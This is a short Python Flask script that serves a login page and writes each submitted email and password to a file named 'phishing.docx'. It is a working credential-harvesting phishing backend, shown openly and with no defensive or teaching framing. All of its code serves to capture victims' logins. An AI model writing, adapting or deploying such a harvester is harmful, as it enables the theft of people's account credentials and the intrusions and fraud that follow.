from flask import *

app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def login():
	if request.method == "POST":
		user = request.form["email"]
		passw = request.form["passw"]
		try:
			with open('phishing.docx', 'a+') as f:
				f.write("\nEmail:  "+ str(user) + "\n" + "Password:  " + str(passw))
		finally:
				f.close()		
		return  render_template("base.html")
	else:
		return render_template("login.html")
		
		
if __name__ == "__main__":
	app.run(debug=True, port=2000)
